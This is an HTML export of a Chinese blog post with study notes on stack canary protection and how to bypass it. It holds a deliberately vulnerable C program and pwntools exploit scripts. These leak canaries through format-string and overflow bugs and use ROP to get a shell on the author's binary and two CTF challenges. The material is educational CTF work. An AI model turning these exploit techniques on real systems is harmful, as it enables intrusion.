@@ -1,0 +1,667 @@
+<!DOCTYPE html>
+<head>
+<meta charset="UTF-8" /><title>PureWeb Blog-canary保护及绕过</title><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/default.min.css" /><script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>  <script>    document.querySelectorAll('code').forEach((code) => {      if (!code.classList.length) {        code.classList.add('language-bash');      }    });  </script>	<script>		document.addEventListener('DOMContentLoaded', (event) => {			hljs.highlightAll();		});	</script><link rel="stylesheet" href="/TestRepogithub.css">
+<link rel="stylesheet" href="/TestRepospeciou.css"
+</head><body><div class="container"><header class="main-header"><h1 class="main-header__title uplize"><a class="main-header__title__link" href="/TestRepo">Joe1sn's Cabin</a></h1><nav class="main-header__nav"><ul class="main-nav"><li class="main-nav__list"><a class="main-nav__list__link active" href="/TestRepo" target="_self">HOME</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="/TestRepoarchives/"target="_self">ARCHIVE</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="https://github.com/Joe1sn"target="_blank">GITHUB</a></li></ul></nav></header></div><div id="write" class>
+<div id="write" class>
+<div class="typora-export os-windows"><div id="write" class>
+<p><strong>2020-4-1 11:23</strong></p>
+<blockquote>
+<p>本文是个人对<a href="https://www.anquanke.com/post/id/177832">Canary保护详解和常用Bypass手段</a>的学习笔记</p>
+</blockquote>
+<!-- more -->
+<h2>canary保护简介:</h2>
+<blockquote>
+<p>canary是一种用来防护栈溢出的保护机制。其原理是在一个函数的入口处，先从fs/gs寄存器中取出一个4字节(eax)或者8字节(rax)的值存到栈上，当函数结束时会检查这个栈上的值是否和存进去的值一致</p>
+</blockquote>
+<p>个人理解:</p>
+<ul>
+<li>canary=金丝雀,就像是之前里面探测瓦斯用的方法一样，金丝雀(canary)就是一个值，插入到了栈里面。函数结束时，如果检测到值改变了(相当于探测到了瓦斯)，执行___stack_chk_fail函数，就会提前退出程序。</li>
+</ul>
+<p>特点:</p>
+<blockquote>
+<p>canary设计是以“x00”结尾，本意就是为了保证canary可以截断字符串。</p>
+</blockquote>
+<h2>C/C++的实现方法:</h2>
+<p>以一个64位程序为例子</p>
+<pre><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+void getshell(void) {
+    system(&quot;/bin/sh&quot;);
+}
+void init() {
+    setbuf(stdin, NULL);
+    setbuf(stdout, NULL);
+    setbuf(stderr, NULL);
+}
+void vuln() {
+    char ooo[100];
+    for(int i=0;i&lt;2;i++){
+        read(0, ooo, 0x200);
+        printf(ooo);
+    }
+}
+int main(void) {
+    init();
+    puts(&quot;Hello radish!&quot;);
+    vuln();
+    return 0;
+}
+</code></pre>
+<p>使用</p>
+<pre><code class="language-bash">gcc -fstack-protector-all pwn4fun.c -o pwn4fun
+</code></pre>
+<p>进行编译</p>
+<pre><code>-fstack-protector：启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码
+-fstack-protector-all：启用堆栈保护，为所有函数插入保护代码。
+-fno-stack-protector：禁用堆栈保护
+</code></pre>
+<h2>进行操作:</h2>
+<pre><code>root@MSI:/mnt/c/Users/13013/Desktop/PWN/canary_porctect&amp;passby/canary_used# rabin2 -I pwn4fun
+arch     x86
+baddr    0x400000
+binsz    7101
+bintype  elf
+bits     64
+canary   true
+class    ELF64
+compiler GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.11) 5.4.0 20160609
+crypto   false
+endian   little
+havecode true
+intrp    /lib64/ld-linux-x86-64.so.2
+laddr    0x0
+lang     c
+linenum  true
+lsyms    true
+machine  AMD x86-64 architecture
+maxopsz  16
+minopsz  1
+nx       true
+os       linux
+pcalign  0
+pic      false
+relocs   true
+relro    partial
+rpath    NONE
+sanitiz  false
+static   false
+stripped false
+subsys   linux
+va       true
+</code></pre>
+<p>可以明显看到canary保护开启了</p>
+<pre><code>root@MSI:/mnt/c/Users/13013/Desktop/PWN/canary_porctect&amp;passby/canary_used# r2 -AAA pwn4fun
+[Cannot analyze at 0x00400660g with sym. and entry0 (aa)
+[x] Analyze all flags starting with sym. and entry0 (aa)
+[Cannot analyze at 0x00400660ac)
+[x] Analyze function calls (aac)
+[x] Analyze len bytes of instructions for references (aar)
+[x] Check for objc references
+[x] Check for vtables
+[x] Type matching analysis for all functions (aaft)
+[x] Propagate noreturn information
+[x] Use -AA or aaaa to perform additional experimental analysis.
+[x] Finding function preludes
+[x] Enable constraint types analysis for variables
+ -- Help subcommand will be eventually removed.
+[0x00400670]&gt; afl
+0x00400670    1 41           entry0
+0x00400650    1 6            sym.imp.__libc_start_main
+0x004006a0    4 50   -&gt; 41   sym.deregister_tm_clones
+0x004006e0    4 58   -&gt; 55   sym.register_tm_clones
+0x00400720    3 28           entry.fini0
+0x00400740    4 38   -&gt; 35   entry.init0
+0x00400930    1 2            sym.__libc_csu_fini
+0x00400934    1 9            sym._fini
+0x00400610    1 6            sym.imp.setbuf
+0x00400600    1 6            sym.imp.__stack_chk_fail
+0x004008c0    4 101          sym.__libc_csu_init
+0x004005f0    1 6            sym.imp.puts
+0x00400620    1 6            sym.imp.system
+0x004005c0    3 26           sym._init
+0x00400630    1 6            sym.imp.printf
+0x00400640    1 6            sym.imp.read
+0x00400766    3 56           sym.getshell
+0x0040079e    3 106          sym.init
+0x00400808    6 104          sym.vuln
+0x00400870    3 80           main
+</code></pre>
+<blockquote>
+<p>这里虽然麻烦，但是还是挂一下r2的反汇编感受一下:</p>
+</blockquote>
+<pre><code>[0x00400670]&gt; pdf@main
+            ; DATA XREF from entry0 @ 0x40068d
+┌ 80: int main (int argc, char **argv, char **envp);
+│           ; var int64_t var_8h @ rbp-0x8
+│           0x00400870      55             push rbp
+│           0x00400871      4889e5         mov rbp, rsp
+│           0x00400874      4883ec10       sub rsp, 0x10
+│           0x00400878      64488b042528.  mov rax, qword fs:[0x28]
+│           0x00400881      488945f8       mov qword [var_8h], rax
+│           0x00400885      31c0           xor eax, eax
+│           0x00400887      b800000000     mov eax, 0
+│           0x0040088c      e80dffffff     call sym.init
+│           0x00400891      bf4c094000     mov edi, str.Hello_radish   ; 0x40094c ; &quot;Hello radish!&quot; ; const char *s
+│           0x00400896      e855fdffff     call sym.imp.puts           ; int puts(const char *s)
+│           0x0040089b      b800000000     mov eax, 0
+│           0x004008a0      e863ffffff     call sym.vuln
+│           0x004008a5      b800000000     mov eax, 0
+│           0x004008aa      488b55f8       mov rdx, qword [var_8h]
+│           0x004008ae      644833142528.  xor rdx, qword fs:[0x28]
+│       ┌─&lt; 0x004008b7      7405           je 0x4008be
+│       │   0x004008b9      e842fdffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
+│       │   ; CODE XREF from main @ 0x4008b7
+│       └─&gt; 0x004008be      c9             leave
+└           0x004008bf      c3             ret
+</code></pre>
+<p>这个就是检查失败过后运行的函数</p>
+<pre><code> 0x004008b9      e842fdffff     call sym.imp.__stack_chk_fail ; void __stack_chk_fail(void)
+</code></pre>
+<p>对canary应该有了个大致印象
+下面为了方便，直接上IDA吧:</p>
+<ul>
+<li>字符串:</li>
+</ul>
+<pre><code>LOAD:0000000000400238	0000001C	C	/lib64/ld-linux-x86-64.so.2
+LOAD:00000000004003E9	0000000A	C	libc.so.6
+LOAD:00000000004003F3	00000005	C	puts
+LOAD:00000000004003F8	00000011	C	__stack_chk_fail
+LOAD:0000000000400409	00000006	C	stdin
+LOAD:000000000040040F	00000007	C	printf
+LOAD:0000000000400416	00000005	C	read
+LOAD:000000000040041B	00000007	C	stdout
+LOAD:0000000000400422	00000007	C	stderr
+LOAD:0000000000400429	00000007	C	system
+LOAD:0000000000400430	00000007	C	setbuf
+LOAD:0000000000400437	00000012	C	__libc_start_main
+LOAD:0000000000400449	0000000F	C	__gmon_start__
+LOAD:0000000000400458	0000000A	C	GLIBC_2.4
+LOAD:0000000000400462	0000000C	C	GLIBC_2.2.5
+.rodata:0000000000400944	00000008	C	/bin/sh
+.rodata:000000000040094C	0000000E	C	Hello radish!
+.eh_frame:0000000000400A0F	00000006	C	;*3$\&quot;
+
+</code></pre>
+<h2>函数check</h2>
+<ul>
+<li>main</li>
+</ul>
+<pre><code class="language-c">int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  init(*(_QWORD *)&amp;argc, argv, envp);
+  puts(&quot;Hello radish!&quot;);
+  vuln(&quot;Hello radish!&quot;);
+  return 0;
+}
+</code></pre>
+<ul>
+<li>vuln</li>
+</ul>
+<pre><code class="language-c">unsigned __int64 vuln()
+{
+  signed int i; // [rsp+Ch] [rbp-74h]
+  char buf; // [rsp+10h] [rbp-70h]
+  unsigned __int64 v3; // [rsp+78h] [rbp-8h]
+
+  v3 = __readfsqword(0x28u);
+  for ( i = 0; i &lt;= 1; ++i )
+  {
+    read(0, &amp;buf, 0x200uLL);
+    printf(&amp;buf, &amp;buf);
+  }
+  return __readfsqword(0x28u) ^ v3;
+}
+</code></pre>
+<p>很明显的一个溢出，而且v3就是canary的值</p>
+<h2>Crash</h2>
+<blockquote>
+<p>v3是 rbp-8h,buf是rbp-70,read可以读入200h,canary的末尾是\x00结尾的
+ 那么我们可以输入 0x70-0x8=0x68的字符串来泄露canary的值</p>
+</blockquote>
+<p>比如说这样:</p>
+<pre><code>root@MSI:/mnt/c/Users/13013/Desktop/PWN/canary_porctect&amp;passby/canary_used# ./pwn4fun
+Hello radish!
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+dg♂`}
+</code></pre>
+<p>为了不让文章太长，直接上EXP（主要是感受）：</p>
+<pre><code class="language-python">from pwn import *
+#context.log_level = 'debug'
+p = process(&quot;./pwn4fun&quot;)
+
+pop_rdi_ret = 0x0400923
+binsh = 0x040077d
+
+print(&quot;========CANARY_LEAK=========&quot;)
+payload = 'a'*104
+p.recvuntil(&quot;Hello radish!&quot;)
+p.sendline(payload)
+p.recvuntil('a'*104+'\n')
+canary = u64(p.recv(7).rjust(8,'\x00'))
+print(&quot;canary=====&gt;&quot;,hex(canary))
+
+print(&quot;========GET_SHELL=========&quot;)
+payload = 'a'*104 + p64(canary) + 'a'*8 + p64(pop_rdi_ret) + p64(0) + p64(binsh)
+p.sendline(payload)
+
+p.interactive()
+</code></pre>
+<p>最后的效果</p>
+<pre><code>root@MSI:/mnt/c/Users/13013/Desktop/PWN/canary_porctect&amp;passby/canary_used# python flag.py
+[+] Starting local process './pwn4fun': pid 165
+========CANARY_LEAK=========
+('canary=====&gt;', '0x6af6e5d7d7b3bd00')
+========GET_SHELL=========
+[*] Switching to interactive mode
+\x7f$ aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa$
+$ ls
+flag  flag.py  pwn4fun    pwn4fun.c
+$ cat flag
+flag{pwn_1s_r34lly_fun}
+</code></pre>
+<h2>EXP说明</h2>
+<blockquote>
+<ul>
+<li>最开始进行泄露，利用printf成功获得canary的值</li>
+<li>栈覆盖过后，利用gadget getshell，</li>
+<li>canary值主要是覆盖后用于验证（rbp-70h的位置）
+#3 感悟
+最后上一张图吧，
+<img src="https://img.joe1sn.top/uploads/big/5b27fc39273c0eafed1a7db3e98fa1ba.png" alt="转自reddit" /></li>
+</ul>
+</blockquote>
+<h2>直接上两道题</h2>
+<h2>ASIS-CTF-Finals-2017 Mary_Morton</h2>
+<h3>检查</h3>
+<pre><code class="language-bash">root@MSI:/mnt/c/Disk E/CTF/Question/XCTF/Pwn/Master/Mary_Morton# rabin2 -I Mary_Morton
+arch     x86
+baddr    0x400000
+binsz    4520
+bintype  elf
+bits     64
+canary   true
+class    ELF64
+compiler GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609
+crypto   false
+endian   little
+havecode true
+intrp    /lib64/ld-linux-x86-64.so.2
+laddr    0x0
+lang     c
+linenum  false
+lsyms    false
+machine  AMD x86-64 architecture
+maxopsz  16
+minopsz  1
+nx       true
+os       linux
+pcalign  0
+pic      false
+relocs   false
+relro    partial
+rpath    NONE
+sanitiz  false
+static   false
+stripped true
+subsys   linux
+va       true
+</code></pre>
+<pre><code>[0x00400730]&gt; afl
+0x00400730    1 41           entry0
+0x004006e0    1 6            sym.imp.__libc_start_main
+0x00400680    1 6            sym.imp.puts
+0x00400690    1 6            sym.imp.__stack_chk_fail
+0x004006a0    1 6            sym.imp.system
+0x004006b0    1 6            sym.imp.printf
+0x004006c0    1 6            sym.imp.alarm
+0x004006d0    1 6            sym.imp.read
+0x004006f0    1 6            sym.imp.setvbuf
+0x00400700    1 6            sym.imp.__isoc99_scanf
+0x00400710    1 6            sym.imp.exit
+0x00400800    8 134  -&gt; 90   entry.init0
+0x004007e0    3 28           entry.fini0
+0x00400760    4 50   -&gt; 41   fcn.00400760
+0x004009ff    1 77           fcn.004009ff
+0x004009da    1 37           fcn.004009da
+0x00400648    3 26           fcn.00400648
+0x00400826    9 180          main
+0x004008eb    3 117          fcn.004008eb
+0x00400960    3 122          fcn.00400960
+0x004008da    1 17           fcn.004008da
+</code></pre>
+<pre><code>LOAD:0000000000400238	0000001C	C	/lib64/ld-linux-x86-64.so.2
+LOAD:0000000000400411	0000000A	C	libc.so.6
+LOAD:000000000040041B	00000005	C	exit
+LOAD:0000000000400420	0000000F	C	__isoc99_scanf
+LOAD:000000000040042F	00000005	C	puts
+LOAD:0000000000400434	00000011	C	__stack_chk_fail
+LOAD:0000000000400445	00000006	C	stdin
+LOAD:000000000040044B	00000007	C	printf
+LOAD:0000000000400452	00000005	C	read
+LOAD:0000000000400457	00000007	C	stdout
+LOAD:000000000040045E	00000006	C	alarm
+LOAD:0000000000400464	00000007	C	system
+LOAD:000000000040046B	00000008	C	setvbuf
+LOAD:0000000000400473	00000012	C	__libc_start_main
+LOAD:0000000000400485	0000000F	C	__gmon_start__
+LOAD:0000000000400494	0000000A	C	GLIBC_2.7
+LOAD:000000000040049E	0000000A	C	GLIBC_2.4
+LOAD:00000000004004A8	0000000C	C	GLIBC_2.2.5
+.rodata:0000000000400AD4	00000019	C	Welcome to the battle ! 
+.rodata:0000000000400AED	0000001B	C	[Great Fairy] level pwned 
+.rodata:0000000000400B08	00000014	C	Select your weapon 
+.rodata:0000000000400B1F	00000005	C	Bye 
+.rodata:0000000000400B24	00000007	C	Wrong!
+.rodata:0000000000400B2B	00000010	C	/bin/cat ./flag
+.rodata:0000000000400B3B	00000007	C	-&gt; %s\n
+.rodata:0000000000400B42	0000001D	C	1. Stack Bufferoverflow Bug 
+.rodata:0000000000400B5F	00000016	C	2. Format String Bug 
+.rodata:0000000000400B75	00000014	C	3. Exit the battle 
+.eh_frame:0000000000400C4F	00000006	C	;*3$\&quot;
+</code></pre>
+<h3>函数分析</h3>
+<ul>
+<li>main</li>
+</ul>
+<pre><code class="language-c">void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
+{
+  const char *v3; // rdi
+  int v4; // [rsp+24h] [rbp-Ch]
+  unsigned __int64 v5; // [rsp+28h] [rbp-8h]
+
+  v5 = __readfsqword(0x28u);
+  sub_4009FF();
+  puts(&quot;Welcome to the battle ! &quot;);
+  puts(&quot;[Great Fairy] level pwned &quot;);
+  v3 = &quot;Select your weapon &quot;;
+  puts(&quot;Select your weapon &quot;);
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      sub_4009DA(v3);
+      v3 = &quot;%d&quot;;
+      __isoc99_scanf(&quot;%d&quot;, &amp;v4);
+      if ( v4 != 2 )
+        break;
+      sub_4008EB();
+    }
+    if ( v4 == 3 )
+    {
+      puts(&quot;Bye &quot;);
+      exit(0);
+    }
+    if ( v4 == 1 )
+    {
+      sub_400960();
+    }
+    else
+    {
+      v3 = &quot;Wrong!&quot;;
+      puts(&quot;Wrong!&quot;);
+    }
+  }
+}
+</code></pre>
+<ul>
+<li>sub_4008EB</li>
+</ul>
+<pre><code class="language-c">unsigned __int64 sub_4008EB()
+{
+  char buf; // [rsp+0h] [rbp-90h]
+  unsigned __int64 v2; // [rsp+88h] [rbp-8h]
+
+  v2 = __readfsqword(0x28u);
+  memset(&amp;buf, 0, 0x80uLL);
+  read(0, &amp;buf, 0x7FuLL);
+  printf(&amp;buf, &amp;buf);                           // ===============HERE
+  return __readfsqword(0x28u) ^ v2;
+}
+</code></pre>
+<p>很明显的一个字符串格式化漏洞，v2也是很明显的是canary保护值，因为他多了一个printf函数，使得我们可以由此泄露出canary的值:</p>
+<pre><code>root@MSI:/mnt/c/Disk E/CTF/Question/XCTF/Pwn/Master/Mary_Morton# ./Mary_Morton
+Welcome to the battle !
+[Great Fairy] level pwned
+Select your weapon
+1. Stack Bufferoverflow Bug
+2. Format String Bug
+3. Exit the battle
+2
+%23$p
+0xe07abcb99a2b4b00
+</code></pre>
+<blockquote>
+<p>简单的计算: 90h - 8h = 88h,但是这里没有足够的空间传入EXP</p>
+</blockquote>
+<ul>
+<li>sub_400960</li>
+</ul>
+<pre><code>unsigned __int64 sub_400960()
+{
+  char buf; // [rsp+0h] [rbp-90h]
+  unsigned __int64 v2; // [rsp+88h] [rbp-8h]
+
+  v2 = __readfsqword(0x28u);
+  memset(&amp;buf, 0, 0x80uLL);
+  read(0, &amp;buf, 0x100uLL);
+  printf(&quot;-&gt; %s\n&quot;, &amp;buf);
+  return __readfsqword(0x28u) ^ v2;
+}
+</code></pre>
+<p>这里就可以栈溢出过后传入EXP</p>
+<h3>EXP编写</h3>
+<pre><code>from pwn import *
+#context.log_level = &quot;debug&quot;
+#p = process(&quot;./Mary_Morton&quot;)
+p = remote(&quot;111.198.29.45&quot;,54072)
+
+cat_flag = 0x04008DE
+pop_rdi_ret = 0x0400ab3
+
+print(&quot;=====+CANARY_LEAK_+=====&quot;)
+payload = &quot;%23$p&quot;
+p.sendafter(&quot;3. Exit the battle&quot;,'2\n')
+p.send(payload)
+p.recvuntil(&quot;0x&quot;)
+canary = int(p.recv(16),16)
+print(&quot;canary====&gt;&quot;+hex(canary))
+print(&quot;&quot;)
+print(&quot;=====+GET_SHELL+=====&quot;)
+payload = 'a'*0x88 + p64(canary) + 'a'*8 + p64(cat_flag)
+
+p.sendafter(&quot;3. Exit the battle&quot;,&quot;1\n&quot;)
+p.send(payload)
+p.interactive()
+</code></pre>
+<p>效果:</p>
+<pre><code>root@MSI:/mnt/c/Disk E/CTF/Question/XCTF/Pwn/Master/Mary_Morton# python flag.py
+[+] Opening connection to 111.198.29.45 on port 54072: Done
+=====+CANARY_LEAK_+=====
+canary====&gt;0xddb008c1b3e3ee00
+
+=====+GET_SHELL+=====
+[*] Switching to interactive mode
+
+-&gt; aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+cyberpeace{9b54a5eeda882afdb751f23239d18c9b}
+[*] Got EOF while reading in interactive
+$
+</code></pre>
+<h3>程序说明</h3>
+<blockquote>
+<p>这里涉及到字符串格式化漏洞的原理，类型转换符会造成核心转储，导致程序关闭，所以用指针类型，那些返回一个0x12345678这样地址，通过计算:0x88/8+6=23(6是gdb中得到的偏移)，所以传入“%23$p”</p>
+</blockquote>
+<h2>攻防世界 高手进阶区 pwn1 厦门邀请赛</h2>
+<h3>检查</h3>
+<pre><code class="language-bash">root@MSI:/mnt/c/Disk E/CTF/Question/XCTF/Pwn/Master/pwn1/pwn1# checksec babystack
+[*] '/mnt/c/Disk E/CTF/Question/XCTF/Pwn/Master/pwn1/pwn1/babystack'
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre>
+<pre><code>[0x00400720]&gt; afl
+0x00400720    1 42           entry0
+0x00400690    1 6            sym.imp.puts
+0x004006a0    1 6            sym.imp.write
+0x004006b0    1 6            sym.imp.strlen
+0x004006c0    1 6            sym.imp.__stack_chk_fail
+0x004006d0    1 6            sym.imp.memset
+0x004006e0    1 6            sym.imp.read
+0x004006f0    1 6            sym.imp.setvbuf
+0x00400700    1 6            sym.imp.atoi
+0x00400710    1 6            sym.imp.exit
+0x004007f0    5 119  -&gt; 62   entry.init0
+0x004007c0    3 34   -&gt; 29   entry.fini0
+0x00400750    4 42   -&gt; 37   fcn.00400750
+0x004001a7    1 36           fcn.004001a7
+0x00400826    1 27           fcn.00400826
+0x004007f7    1 47           fcn.004007f7
+0x004008b9    1 79           fcn.004008b9
+0x00400668    3 23           fcn.00400668
+0x00400841    5 120          fcn.00400841
+0x00400908   12 291          main
+</code></pre>
+<pre><code>root@MSI:/mnt/c/Disk E/CTF/Question/XCTF/Pwn/Master/pwn1/pwn1# ./babystack  
+--------                                                                    
+1.store                                                                     
+2.print                                                                     
+3.quit                                                                      
+--------                                                                    
+&gt;&gt;
+</code></pre>
+<p>字符串</p>
+<pre><code>LOAD:0000000000400238	0000001C	C	/lib64/ld-linux-x86-64.so.2
+LOAD:0000000000400431	0000000A	C	libc.so.6
+LOAD:000000000040043B	00000005	C	exit
+LOAD:0000000000400440	00000005	C	puts
+LOAD:0000000000400445	00000011	C	__stack_chk_fail
+LOAD:0000000000400456	00000006	C	stdin
+LOAD:000000000040045C	00000007	C	strlen
+LOAD:0000000000400463	00000007	C	memset
+LOAD:000000000040046A	00000005	C	read
+LOAD:000000000040046F	00000007	C	stdout
+LOAD:0000000000400476	00000007	C	stderr
+LOAD:000000000040047D	00000005	C	atoi
+LOAD:0000000000400482	00000008	C	setvbuf
+LOAD:000000000040048A	00000012	C	__libc_start_main
+LOAD:000000000040049C	00000006	C	write
+LOAD:00000000004004A2	0000000A	C	GLIBC_2.4
+LOAD:00000000004004AC	0000000C	C	GLIBC_2.2.5
+LOAD:00000000004004B8	0000000F	C	__gmon_start__
+.rodata:0000000000400AB4	00000009	C	--------
+.rodata:0000000000400ABD	00000008	C	1.store
+.rodata:0000000000400AC5	00000008	C	2.print
+.rodata:0000000000400ACD	00000007	C	3.quit
+.rodata:0000000000400AD8	0000000F	C	invalid choice
+.eh_frame:0000000000400BA7	00000006	C	;*3$\&quot;
+</code></pre>
+<h3>函数检查</h3>
+<ul>
+<li>main</li>
+</ul>
+<pre><code class="language-c">__int64 __fastcall main(__int64 a1, char **a2, char **a3)
+{
+  char *v3; // rsi
+  char *v4; // rdi
+  int v5; // eax
+  char s; // [rsp+10h] [rbp-90h]
+  unsigned __int64 v8; // [rsp+98h] [rbp-8h]
+
+  v8 = __readfsqword(0x28u);
+  setvbuf(stdin, 0LL, 2, 0LL);
+  setvbuf(stdout, 0LL, 2, 0LL);
+  setvbuf(stderr, 0LL, 2, 0LL);
+  v3 = 0LL;
+  v4 = &amp;s;
+  memset(&amp;s, 0, 0x80uLL);
+  while ( 1 )
+  {
+    sub_4008B9(v4, v3);
+    v5 = sub_400841();
+    switch ( v5 )
+    {
+      case 2:
+        puts(&amp;s);
+        break;
+      case 3:
+        return 0LL;
+      case 1:
+        v3 = &amp;s;
+        read(0, &amp;s, 0x100uLL);
+        break;
+      default:
+        sub_400826(&quot;invalid choice&quot;);
+        break;
+    }
+    v4 = (char *)&amp;unk_400AE7;
+    sub_400826(&amp;unk_400AE7);
+  }
+}
+</code></pre>
+<p>case1 的时候有一个很明显的栈溢出漏洞</p>
+<pre><code>v8 = __readfsqword(0x28u);
+</code></pre>
+<blockquote>
+<p>说明v8是一个canary的值，这里就要做减法了:
+90h - 8 = 88h，所以要泄漏的地址也是一样的
+##2.3 大致思路
+我们选择先填充，再选择2把canary打印出来
+然后再libc偏移计算（结合ROP绕过NX）
+##2.4 EXP:</p>
+</blockquote>
+<pre><code class="language-python">from pwn import *
+#context.log_level = 'debug'
+#p = remote(&quot;111.198.29.45&quot;,35595)
+p = process(&quot;./babystack&quot;)
+elf = ELF(&quot;babystack&quot;)
+libc = ELF(&quot;libc-2.23.so&quot;)
+
+pop_rdi_ret = 0x00400a93
+start_addr = 0x00400720
+puts_got = elf.got['puts']
+puts_plt = elf.plt['puts']
+bash_offset = 0x45216
+
+##canary_leak
+print(&quot;========canary_leak========&quot;)
+p.sendafter(&quot;&gt;&gt;&quot;,'1\n')
+payload = 'a'*0x88
+p.sendline(payload)
+p.sendafter(&quot;&gt;&gt;&quot;,'2\n')
+p.recvuntil(&quot;a&quot;*0x88+'\n')
+cannry = u64(p.recv(7).rjust(8,&quot;\x00&quot;))
+#0x2d2d2d2d2d0a0a
+print('cannry=====&gt;'+hex(cannry))
+
+##libc_base_leak
+print(&quot;========libc_base_leak==========&quot;)
+payload = 'a'*0x88 + p64(cannry) + 'a'*8 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start_addr)
+p.sendlineafter(&quot;&gt;&gt;&quot;,'1\n')
+p.sendline(payload)
+p.sendlineafter(&quot;&gt;&gt;&quot;,'3\n')
+#puts_addr = u64(p.recv(6).ljust(8,'\x00'))
+#print(&quot;puts_addr===&gt;&quot;+hex(puts_addr))
+
+p.recv()
+puts_addr = u64(p.recv(6).ljust(8, '\x00'))
+print (&quot;puts_addr===&gt;&quot; +hex(puts_addr))
+libc_base =  puts_addr - libc.symbols['puts']
+bin_sh = libc_base + bash_offset
+
+##getshell
+print(&quot;==========getshell===========&quot;)
+p.sendlineafter(&quot;&gt;&gt;&quot;,'1')
+payload = 'a'*0x88 + p64(cannry) + 'a'*8 + p64(bin_sh)
+p.sendline(payload)
+p.sendlineafter(&quot;&gt;&gt;&quot;,'3')
+p.interactive()
+</code></pre>
+
+</div>
+</div></body>
